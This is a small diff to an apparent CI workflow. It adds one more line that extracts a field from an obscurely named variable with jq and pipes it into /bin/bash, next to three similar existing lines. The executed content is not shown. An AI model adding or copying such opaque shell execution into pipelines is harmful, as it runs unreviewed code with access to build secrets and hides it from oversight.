@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$gb1" | jq -r .vv5 | /bin/bash
           echo $sel871 | jq -r .xedwi79 | /bin/bash
           echo $ocrx93 | jq -r .fmlte512 | /bin/bash
+          echo $a8 | jq -r .ejofo1 | /bin/bash
 
       - name: Upload artifact
         if: always()
